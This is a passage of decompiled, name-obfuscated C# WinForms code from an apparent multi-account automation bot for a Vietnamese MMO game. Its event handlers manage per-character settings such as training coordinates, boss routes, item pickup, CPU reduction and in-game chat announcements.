		for (int i = 0; i < Class20.string_1.Length; i++)
		{
			if (text == Class20.string_1[i])
			{
				if (Class20.int_0 != i)
				{
					Class20.int_0 = i;
					Class66.smethod_11(Class66.smethod_1(), "IndexChienlongdong", Class20.int_0, "", 0);
				}
				break;
			}
		}
	}

	private void method_20(ListView listView_0, int int_159 = 0)
	{
		if (listView_0.Items == null)
		{
			return;
		}
		int count = listView_0.Items.Count;
		if (count != 0)
		{
			if (int_159 >= count)
			{
				int_159 = count - 1;
			}
			listView_0.TopItem = listView_0.Items[int_159];
			listView_0.Items[int_159].Focused = true;
			listView_0.Items[int_159].Selected = true;
		}
	}

	private void method_21(ListView listView_0, uint[] uint_5)
	{
		int num = 0;
		if (listView_0.Items != null)
		{
			num = listView_0.Items.Count;
		}
		string[] array = new string[2]
		{
			num.ToString(),
			uint_5[0] + "," + uint_5[1]
		};
		ListViewItem listViewItem = new ListViewItem(array[0]);
		ListViewItem.ListViewSubItem item = new ListViewItem.ListViewSubItem(listViewItem, array[1]);
		listViewItem.SubItems.Add(item);
		listView_0.Items.Add(listViewItem);
	}

	private void listViewTrain_MouseDown(object sender, MouseEventArgs e)
	{
		if (listView1.Items == null)
		{
			int_153 = -1;
		}
		else
		{
			int_153 = Class87.smethod_4(listViewTrain, e, 1);
		}
		if (0 <= int_153)
		{
			_ = listViewTrain.Items[int_153].SubItems[1].Text;
		}
		buttonXoaToadoTrain.Text = "Xóa (" + int_153 + ")";
	}

	private void buttonLayToadoTrain_Click(object sender, EventArgs e)
	{
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		int num2 = Class39.smethod_0(characterAccountConfig_1[num]);
		if (num2 != characterAccountConfig_1[num].int_32 && characterAccountConfig_1[num].int_32 > 0)
		{
			listViewTrain.Items.Clear();
			characterAccountConfig_1[num].uint_0 = null;
		}
		characterAccountConfig_1[num].int_32 = num2;
		textBoxMapName.Text = Class39.smethod_1(num2, bool_0: true);
		uint[] array = Class38.smethod_30(characterAccountConfig_1[num]);
		if (characterAccountConfig_1[num].uint_0 != null)
		{
			for (int i = 0; i < characterAccountConfig_1[num].uint_0.GetLength(0); i++)
			{
				if (characterAccountConfig_1[num].uint_0[i, 0] == array[0] && characterAccountConfig_1[num].uint_0[i, 1] == array[1])
				{
					return;
				}
			}
		}
		Class11.smethod_55(ref characterAccountConfig_1[num].uint_0, array);
		method_21(listViewTrain, array);
		if (0 <= int_153 && int_153 < listViewTrain.Items.Count)
		{
			listViewTrain.Items[int_153].Selected = false;
			listViewTrain.Items[int_153].Focused = false;
		}
		int_153 = listViewTrain.Items.Count - 1;
		method_20(listViewTrain, int_153);
		Class56.smethod_13(characterAccountConfig_1[num]);
	}

	private void buttonXoaToadoTrain_Click(object sender, EventArgs e)
	{
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		if (int_153 >= 0 && listViewTrain.Items != null && listViewTrain.Items.Count > 0)
		{
			string[] array = listViewTrain.Items[int_153].SubItems[1].Text.Split(',');
			if (array.Length < 2)
			{
				return;
			}
			uint[] array2 = new uint[2]
			{
				Class11.smethod_12(array[0]),
				Class11.smethod_12(array[1])
			};
			listViewTrain.Items.RemoveAt(int_153);
			Class11.smethod_56(ref characterAccountConfig_1[num].uint_0, array2);
			if (characterAccountConfig_1[num].uint_0 != null && listViewTrain.Items.Count != 0)
			{
				for (int i = 0; i < listViewTrain.Items.Count; i++)
				{
					listViewTrain.Items[i].SubItems[0].Text = i.ToString();
				}
				if (listViewTrain.Items.Count <= int_153)
				{
					int_153 = listViewTrain.Items.Count - 1;
				}
				listViewTrain.Items[int_153].Focused = true;
				listViewTrain.Items[int_153].Selected = true;
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
			else
			{
				listViewTrain.Items.Clear();
				int_153 = -1;
			}
		}
		else
		{
			int_153 = -1;
		}
	}

	private void checkBoxTrain_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_25 = Convert.ToByte(checkBoxTrain.Checked);
				characterAccountConfig_1[num].bool_11 = true;
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxNhatdoDichuyenGan_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_51 = Convert.ToByte(checkBoxNhatdoDichuyenGan.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void buttonDoctep_Click(object sender, EventArgs e)
	{
		string text = Class56.string_8 + "\\Toado";
		Class11.smethod_23(text);
		string text2 = Class56.smethod_26(text, "", "*.xyz");
		if (text2 == string.Empty)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		int_153 = -1;
		listViewTrain.Items.Clear();
		bool_23 = false;
		string text3 = Class11.smethod_15(Class11.smethod_33(text2, 0, 0, 1));
		if (!(text3 == string.Empty))
		{
			string[] array = text3.Split('|');
			if (array.Length >= 2)
			{
				characterAccountConfig_1[num].int_32 = Class11.smethod_11(array[0]);
				if (characterAccountConfig_1[num].int_32 != 0)
				{
					characterAccountConfig_1[num].uint_0 = null;
					string[] array2 = array[1].Split(':');
					if (array2 != null && array2.Length != 0)
					{
						characterAccountConfig_1[num].uint_0 = new uint[array2.Length, 2];
						for (int i = 0; i < array2.Length; i++)
						{
							string[] array3 = array2[i].Split(';');
							if (array3.Length == 2)
							{
								for (int j = 0; j < 2; j++)
								{
									characterAccountConfig_1[num].uint_0[i, j] = Class11.smethod_12(array3[j]);
								}
							}
						}
					}
					textBoxMapName.Text = Class39.smethod_1(characterAccountConfig_1[num].int_32, bool_0: true);
					if (characterAccountConfig_1[num].uint_0 != null)
					{
						for (int k = 0; k < characterAccountConfig_1[num].uint_0.GetLength(0); k++)
						{
							method_21(listViewTrain, new uint[2]
							{
								characterAccountConfig_1[num].uint_0[k, 0],
								characterAccountConfig_1[num].uint_0[k, 1]
							});
						}
					}
					bool_23 = true;
					return;
				}
			}
		}
		characterAccountConfig_1[num].int_32 = 0;
		characterAccountConfig_1[num].uint_0 = null;
		textBoxMapName.Text = string.Empty;
		bool_23 = true;
	}

	private void buttonLuutep_Click(object sender, EventArgs e)
	{
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		CharacterAccountConfig characterAccountConfig = characterAccountConfig_1[num];
		string text = Class56.string_8 + "\\Toado";
		Class11.smethod_23(text);
		string text2 = Class56.smethod_27(text, Class1.smethod_1(characterAccountConfig.string_22, 1) + ".xyz");
		if (text2 == string.Empty)
		{
			return;
		}
		string text3 = string.Empty;
		if (characterAccountConfig.uint_0 != null)
		{
			for (int i = 0; i < characterAccountConfig.uint_0.GetLength(0); i++)
			{
				if (text3 != string.Empty)
				{
					text3 += ":";
				}
				object obj = text3;
				text3 = string.Concat(obj, characterAccountConfig.uint_0[i, 0], ";", characterAccountConfig.uint_0[i, 1]);
			}
		}
		string text4 = characterAccountConfig.int_32 + "|" + text3;
		Class11.smethod_34(text2, Class11.smethod_16(text4), 2);
	}

	private void buttonApdungAllTrain_Click(object sender, EventArgs e)
	{
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		if (characterAccountConfig_1[num].int_60 == null)
		{
			characterAccountConfig_1[num].int_60 = new int[2];
		}
		if (characterAccountConfig_1[num].int_53 == null)
		{
			characterAccountConfig_1[num].int_53 = new int[5];
		}
		CharacterAccountConfig characterAccountConfig = characterAccountConfig_1[num];
		for (int i = 0; i < characterAccountConfig_1.Length; i++)
		{
			if (i == num)
			{
				continue;
			}
			characterAccountConfig_1[i].int_32 = characterAccountConfig.int_32;
			characterAccountConfig_1[i].uint_0 = null;
			characterAccountConfig_1[i].int_33 = characterAccountConfig.int_33;
			characterAccountConfig_1[i].int_57 = characterAccountConfig.int_57;
			characterAccountConfig_1[i].int_59 = characterAccountConfig.int_59;
			characterAccountConfig_1[i].int_60 = new int[2]
			{
				characterAccountConfig.int_60[0],
				characterAccountConfig.int_60[1]
			};
			characterAccountConfig_1[i].int_19 = characterAccountConfig.int_19;
			characterAccountConfig_1[i].int_18 = characterAccountConfig.int_18;
			characterAccountConfig_1[i].int_61 = characterAccountConfig.int_61;
			characterAccountConfig_1[i].int_51 = characterAccountConfig.int_51;
			characterAccountConfig_1[i].int_52 = characterAccountConfig.int_52;
			characterAccountConfig_1[i].int_40 = characterAccountConfig.int_40;
			characterAccountConfig_1[i].int_62 = characterAccountConfig.int_62;
			characterAccountConfig_1[i].int_53 = new int[5];
			for (int j = 0; j < 5; j++)
			{
				characterAccountConfig_1[i].int_53[j] = characterAccountConfig.int_53[j];
			}
			characterAccountConfig_1[i].uint_0 = null;
			if (characterAccountConfig.uint_0 != null)
			{
				characterAccountConfig_1[i].uint_0 = new uint[characterAccountConfig.uint_0.GetLength(0), 2];
				for (int k = 0; k < characterAccountConfig.uint_0.GetLength(0); k++)
				{
					characterAccountConfig_1[i].uint_0[k, 0] = characterAccountConfig.uint_0[k, 0];
					characterAccountConfig_1[i].uint_0[k, 1] = characterAccountConfig.uint_0[k, 1];
				}
			}
			characterAccountConfig_1[i].int_25 = characterAccountConfig.int_25;
			characterAccountConfig_1[i].int_26 = characterAccountConfig.int_26;
			characterAccountConfig_1[i].int_28 = characterAccountConfig.int_28;
			characterAccountConfig_1[i].int_29 = characterAccountConfig.int_29;
			characterAccountConfig_1[i].int_27 = characterAccountConfig.int_27;
			characterAccountConfig_1[i].int_30 = characterAccountConfig.int_30;
			characterAccountConfig_1[i].int_31 = characterAccountConfig.int_31;
			characterAccountConfig_1[i].bool_11 = true;
			characterAccountConfig_1[i].int_38 = characterAccountConfig.int_38;
			characterAccountConfig_1[i].int_37 = characterAccountConfig.int_37;
			Class56.smethod_13(characterAccountConfig_1[i]);
		}
		method_2("Đã áp dụng mục Train cho tất cả ac (ngoại trừ mục Lượm rác)");
	}

	private void checkBoxTranhBossVang_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_57 = Convert.ToByte(checkBoxTranhBossVang.Checked);
				characterAccountConfig_1[num].bool_11 = true;
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxTDPSaimap_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_59 = Convert.ToByte(checkBoxTDPSaimap.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxMuathuocPK_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].bool_5 = checkBoxMuathuocPK.Checked;
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxChaydanhvong_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].bool_4 = checkBoxChaydanhvong.Checked;
			}
		}
	}

	private void checkBoxChayPKNguoidung_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_34 = Convert.ToByte(checkBoxChayPKNguoidung.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
				Class69.int_0 = characterAccountConfig_1[num].int_136;
			}
		}
	}

	private void comboBoxDoSatcuuSat_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		string text = comboBoxDoSatcuuSat.Text;
		int num2 = 0;
		while (true)
		{
			if (num2 < string_39.Length)
			{
				if (text == string_39[num2])
				{
					break;
				}
				num2++;
				continue;
			}
			return;
		}
		characterAccountConfig_1[num].int_33 = num2;
		Class56.smethod_13(characterAccountConfig_1[num]);
		if (num2 == 1)
		{
			try
			{
				string path = "dosat.txt";
				string path2 = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, path);
				if (!File.Exists(path2))
				{
					string text2 = "=== LOG ĐỐI TƯỢNG NGUY HIỂM - THỔ ĐỊA PHÙ ===\n";
					text2 += "Format: [Thời gian] Player: Tên nhân vật | Đồ Sát: Tên đối tượng | Status: Trạng thái\n";
					text2 += "================================================================\n\n";
					File.WriteAllText(path2, text2, Encoding.UTF8);
				}
			}
			catch
			{
			}
		}
		if (baodskenhbang.Checked)
		{
			string value = "";
			switch (num2)
			{
			case 0:
				value = "";
				break;
			case 1:
				value = "Cøu T«i §ang BÞ §å S\u00b8t !";
				break;
			case 2:
				value = "";
				break;
			case 3:
				value = "";
				break;
			}
			if (!string.IsNullOrEmpty(value))
			{
				Class75.smethod_55(characterAccountConfig_1[num], value, "CH_TONG");
				Thread.Sleep(300);
			}
		}
	}

	private void buttonXoaIDAcChinh_Click(object sender, EventArgs e)
	{
		comboBoxAccChinh.Items.Clear();
		Class46.characterSyncSnapshot_0.int_0 = 0;
		string_22 = string.Empty;
		int_58 = 0;
		Class66.smethod_11(Class66.smethod_1(), "AccChinhNameA", string.Empty, "", 0);
	}

	private void buttonBaoToado_Click(object sender, EventArgs e)
	{
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0)
		{
			CharacterAccountConfig characterAccountConfig = characterAccountConfig_1[num];
			uint[] array = Class38.smethod_30(characterAccountConfig);
			string text = null;
			text = Class39.smethod_0(characterAccountConfig) switch
			{
				322 => "Tr\u00adêng B¹ch s¬n B¾c", 
				321 => "Tr\u00adêng B¹ch s¬n Nam", 
				_ => Class39.smethod_2(characterAccountConfig), 
			};
			string text2 = "§ang ë (" + array[0] / 256 + "," + array[1] / 512 + ") " + text;
			Class75.smethod_55(characterAccountConfig, text2, "CH_CHATROOM");
			Class75.smethod_55(characterAccountConfig, text2, "CH_TONG");
			try
			{
				Clipboard.SetText(Class1.smethod_1(text2, 1));
			}
			catch
			{
			}
		}
	}

	private void method_22(object sender, EventArgs e)
	{
		if (Dangky.int_0 > 0)
		{
			Dangky.int_0 = 0;
		}
		else
		{
			new Dangky().Show();
		}
	}

	private void method_23()
	{
		if (FormRauria.bool_0)
		{
			FormRauria.bool_0 = false;
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (0 > num)
		{
			FormRauria.int_0 = 0;
			FormRauria.string_0 = null;
		}
		else
		{
			FormRauria.int_0 = characterAccountConfig_1[num].int_136;
			FormRauria.string_0 = Class83.smethod_18(characterAccountConfig_1[num]);
		}
		try
		{
			FormRauria formRauria = new FormRauria();
			formRauria.int_2 = base.Left;
			formRauria.int_3 = base.Top;
			formRauria.int_4 = base.Width;
			formRauria.int_5 = base.Height;
			formRauria.Show();
		}
		catch
		{
		}
	}

	private void buttonMorong_Click(object sender, EventArgs e)
	{
		method_23();
	}

	private void richTextBoxChedoMayphu_MouseClick(object sender, MouseEventArgs e)
	{
		method_23();
	}

	private void buttonUuTien_Click(object sender, EventArgs e)
	{
		if (FormUutienNguHanh.int_0 <= 0)
		{
			int num = -1;
			int num2 = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num2 < 0)
			{
				string text = comboBoxUuTien.Text;
				for (int i = 0; i < string_30.Length; i++)
				{
					if (text == string_30[i])
					{
						num = i;
						break;
					}
				}
				if (num < 0 || num > 0)
				{
					return;
				}
			}
			else
			{
				num = characterAccountConfig_1[num2].int_88;
			}
			if (num > 0)
			{
				try
				{
					FormUutienNguHanh.int_0 = characterAccountConfig_1[num2].int_136;
					FormUutienNguHanh.string_0 = Class83.smethod_18(characterAccountConfig_1[num2]);
					FormUutienNguHanh formUutienNguHanh = new FormUutienNguHanh();
					formUutienNguHanh.int_1 = base.Left;
					formUutienNguHanh.int_2 = base.Top;
					formUutienNguHanh.Show();
					return;
				}
				catch
				{
					return;
				}
			}
			if (!FormTuychon.bool_0)
			{
				try
				{
					FormTuychon.int_1 = 3;
					FormTuychon formTuychon = new FormTuychon();
					formTuychon.Show();
					return;
				}
				catch
				{
					return;
				}
			}
			FormTuychon.bool_0 = false;
		}
		else
		{
			FormUutienNguHanh.int_0 = 0;
		}
	}

	private void checkBoxOluonMapphu_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_44 = Convert.ToByte(checkBoxOluonMapphu.Checked);
			Class66.smethod_11(Class66.smethod_1(), "flagOLuonMapPhu", int_44, "", 0);
		}
	}

	private void buttonBungTuimau_Click(object sender, EventArgs e)
	{
		if (FormHaucanTuithuoc.bool_0)
		{
			FormHaucanTuithuoc.bool_0 = false;
			return;
		}
		try
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				FormHaucanTuithuoc.int_0 = characterAccountConfig_1[num].int_136;
				FormHaucanTuithuoc formHaucanTuithuoc = new FormHaucanTuithuoc();
				formHaucanTuithuoc.int_2 = base.Left;
				formHaucanTuithuoc.int_3 = base.Top;
				formHaucanTuithuoc.int_4 = base.Width;
				formHaucanTuithuoc.int_5 = base.Height;
				formHaucanTuithuoc.Show();
			}
		}
		catch
		{
		}
	}

	private void checkBoxVeThanhKhiPKlon_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_104[0] = Convert.ToByte(checkBoxVeThanhKhiPKlon.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void buttonGiamCPUAll_Click(object sender, EventArgs e)
	{
		method_24();
	}

	private void method_24(int int_159 = -1)
	{
		if (int_154 > 0)
		{
			return;
		}
		buttonGiamCPUAll.Enabled = false;
		if (0 > int_159)
		{
			int_155 = 0;
			string text = comboBoxGiamCpu.Text;
			for (int i = 0; i < string_40.Length; i++)
			{
				if (string_40[i] == text)
				{
					int_155 = i;
					break;
				}
			}
		}
		else
		{
			int_155 = int_159;
		}
		int_154 = 1;
		new Thread(method_25).Start();
	}

	private void method_25()
	{
		if (characterAccountConfig_1 != null)
		{
			while (true)
			{
				try
				{
					if (int_155 < 0)
					{
						int_155 = 0;
					}
					CharacterAccountConfig characterAccountConfig = default(CharacterAccountConfig);
					for (int i = 0; i < characterAccountConfig_1.Length; i++)
					{
						if (characterAccountConfig_1[i].int_136 == Class46.characterSyncSnapshot_0.int_0)
						{
							characterAccountConfig_1[i].int_89 = 0;
							characterAccountConfig = characterAccountConfig_1[i];
							Class50.smethod_0(characterAccountConfig, 0, int_155);
							Class75.smethod_52(characterAccountConfig, "<color=green>Ac chÝnh: <color=red>T¾t");
							Class56.smethod_13(characterAccountConfig);
						}
						else
						{
							characterAccountConfig_1[i].int_89 = int_155;
							characterAccountConfig = characterAccountConfig_1[i];
							Class50.smethod_0(characterAccountConfig, int_155);
							Class56.smethod_13(characterAccountConfig);
						}
					}
				}
				catch
				{
					Thread.Sleep(100);
					continue;
				}
				break;
			}
			int_154 = 2;
		}
		else
		{
			int_154 = 2;
		}
	}

	private void comboBoxGiamCpu_SelectedIndexChanged(object sender, EventArgs e)
	{
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		int num2 = -1;
		string text = comboBoxGiamCpu.Text;
		for (int i = 0; i < string_40.Length; i++)
		{
			if (string_40[i] == text)
			{
				num2 = i;
				break;
			}
		}
		if (num2 != characterAccountConfig_1[num].int_89)
		{
			characterAccountConfig_1[num].int_89 = num2;
			CharacterAccountConfig characterAccountConfig = characterAccountConfig_1[num];
			Class50.smethod_0(characterAccountConfig, num2);
			Class56.smethod_13(characterAccountConfig);
		}
	}

	private void checkBoxDameMacdinh_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			FormDame.int_7 = Convert.ToByte(checkBoxDameMacdinh.Checked);
			FormDame.int_6 = FormDame.int_7;
			Class66.smethod_11(Class66.smethod_1(), "flagDameMacdinh", FormDame.int_6, "", 0);
			if (FormDame.int_6 > 0 && int_69 <= 0)
			{
				int_69 = 1;
				GClass0.smethod_0();
				checkBoxPhimTat.Checked = true;
			}
		}
	}

	private void buttonDame_Click(object sender, EventArgs e)
	{
		if (FormDame.bool_0)
		{
			FormDame.bool_0 = false;
			return;
		}
		try
		{
			FormDame.int_5 = 0;
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (0 <= num)
			{
				FormDame.int_5 = characterAccountConfig_1[num].int_136;
			}
			FormDame formDame = new FormDame();
			formDame.int_1 = Cursor.Position.X;
			formDame.int_2 = Cursor.Position.Y;
			formDame.int_3 = base.Width;
			formDame.int_4 = base.Height;
			formDame.Show();
		}
		catch
		{
		}
	}

	private void buttonAnhet_Click(object sender, EventArgs e)
	{
		new Thread(method_26).Start();
	}

	private void method_26()
	{
		if (characterAccountConfig_1 == null)
		{
			return;
		}
		for (int i = 0; i < characterAccountConfig_1.Length; i++)
		{
			try
			{
				if (characterAccountConfig_1[i].int_136 != Class46.characterSyncSnapshot_0.int_0)
				{
					int num = 0;
					while (uint_2 != 0 && num < 30)
					{
						Thread.Sleep(10);
						num++;
					}
					uint_2 = characterAccountConfig_1[i].uint_4;
					new Thread(method_9).Start();
				}
			}
			catch
			{
			}
		}
	}

	private void checkBoxTuChayBoss_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].bool_1 = checkBoxTuChayBoss.Checked;
			}
		}
	}

	private void buttonSuaXoa_Click(object sender, EventArgs e)
	{
		if (FormChayBoss.bool_0)
		{
			FormChayBoss.bool_0 = false;
			return;
		}
		try
		{
			FormChayBoss formChayBoss = new FormChayBoss();
			formChayBoss.int_0 = base.Left;
			formChayBoss.int_1 = base.Top;
			formChayBoss.int_2 = base.Width;
			formChayBoss.int_3 = base.Height;
			formChayBoss.Show();
		}
		catch
		{
		}
	}

	private int method_27()
	{
		string text = comboBoxNoiBoss.Text;
		if (FormChayBoss.string_2 != null)
		{
			for (int i = 0; i < FormChayBoss.string_2.GetLength(0); i++)
			{
				if (text == FormChayBoss.string_2[i, 0])
				{
					return i;
				}
			}
		}
		return -1;
	}

	private void buttonBossAll_Click(object sender, EventArgs e)
	{
		int num = -1;
		bool flag;
		if (flag = checkBoxTuChayBoss.Checked)
		{
			num = method_27();
		}
		if (characterAccountConfig_1 == null)
		{
			return;
		}
		for (int i = 0; i < characterAccountConfig_1.Length; i++)
		{
			if (characterAccountConfig_1[i].bool_25)
			{
				characterAccountConfig_1[i].int_0 = num;
				characterAccountConfig_1[i].bool_1 = flag;
			}
		}
	}

	private void comboBoxNoiBoss_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				int num2 = method_27();
				characterAccountConfig_1[num].int_0 = num2;
				buttonDenDiemKetiep.Text = "Đến điểm kế tiếp" + Class56.string_7 + "( " + (num2 + 1) + " )";
			}
		}
	}

	private void buttonMoGame_Click(object sender, EventArgs e)
	{
		Class2.smethod_1();
	}

	private void textBoxPhamviNhat_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_52 = Class11.smethod_11(textBoxPhamviNhat.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxLuomrac_CheckedChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		characterAccountConfig_1[num].int_54 = Convert.ToByte(checkBoxLuomrac.Checked);
		Class56.smethod_13(characterAccountConfig_1[num]);
		if (characterAccountConfig_1[num].int_54 <= 0)
		{
			return;
		}
		if (FormLuomrac.bool_0)
		{
			FormLuomrac.bool_0 = false;
			return;
		}
		try
		{
			FormLuomrac.int_0 = characterAccountConfig_1[num].int_136;
			FormLuomrac formLuomrac = new FormLuomrac();
			formLuomrac.int_1 = Cursor.Position.X;
			formLuomrac.int_2 = Cursor.Position.Y;
			formLuomrac.int_3 = base.Width;
			formLuomrac.int_4 = base.Height;
			formLuomrac.Show();
		}
		catch
		{
		}
	}

	private void checkBoxSLThoat_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_19 = Convert.ToByte(checkBoxSLThoat.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxSLThoat_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_18 = Class11.smethod_11(textBoxSLThoat.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void comboBoxXuongNgua_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		string text = comboBoxXuongNgua.Text;
		int num2 = 0;
		while (true)
		{
			if (num2 < string_31.Length)
			{
				if (text == string_31[num2])
				{
					break;
				}
				num2++;
				continue;
			}
			return;
		}
		characterAccountConfig_1[num].int_93 = num2;
		Class56.smethod_13(characterAccountConfig_1[num]);
		if (num2 == 0 && !Class38.smethod_19(characterAccountConfig_1[num]))
		{
			Class75.smethod_57(characterAccountConfig_1[num], "Switch([[horse]])");
		}
	}

	private void checkBoxPheThu_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_29 = Convert.ToByte(checkBoxPheThu.Checked);
		}
	}

	private void checkBoxAnThuocTDD_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_64[0] = Convert.ToByte(checkBoxAnThuocTDD.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxTocdoDanh_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_64[1] = Class11.smethod_11(textBoxTocdoDanh.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void buttonThuocTDD_Click(object sender, EventArgs e)
	{
		if (FormThuocTocdoDanh.bool_0)
		{
			FormThuocTocdoDanh.bool_0 = false;
			return;
		}
		try
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				FormThuocTocdoDanh.int_0 = characterAccountConfig_1[num].int_136;
				FormThuocTocdoDanh formThuocTocdoDanh = new FormThuocTocdoDanh();
				formThuocTocdoDanh.int_2 = Cursor.Position.X;
				formThuocTocdoDanh.int_3 = Cursor.Position.Y;
				formThuocTocdoDanh.int_4 = base.Width;
				formThuocTocdoDanh.int_5 = base.Height;
				formThuocTocdoDanh.Show();
			}
		}
		catch
		{
		}
	}

	private void buttonThuocLag_Click(object sender, EventArgs e)
	{
		if (FormThuocLag.bool_0)
		{
			FormThuocLag.bool_0 = false;
			return;
		}
		try
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				FormThuocLag.int_0 = characterAccountConfig_1[num].int_136;
				FormThuocLag formThuocLag = new FormThuocLag();
				formThuocLag.int_2 = Cursor.Position.X;
				formThuocLag.int_3 = Cursor.Position.Y;
				formThuocLag.int_4 = base.Width;
				formThuocLag.int_5 = base.Height;
				formThuocLag.Show();
			}
		}
		catch
		{
		}
	}

	private void buttonPhimHDCTC_Click(object sender, EventArgs e)
	{
		string text = "https://youtu.be/72eBN2IrG5Q";
		Class24.smethod_40(Class66.smethod_0(), "", text, 0);
	}

	private void comboBoxTenHieuThuocTamtru_MouseDown(object sender, MouseEventArgs e)
	{
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		bool_23 = false;
		comboBoxTenHieuThuocTamtru.Items.Clear();
		string_54 = null;
		Class3.smethod_25(characterAccountConfig_1[num], ref string_54, 3);
		if (string_54 != null)
		{
			for (int i = 0; i < string_54.Length; i++)
			{
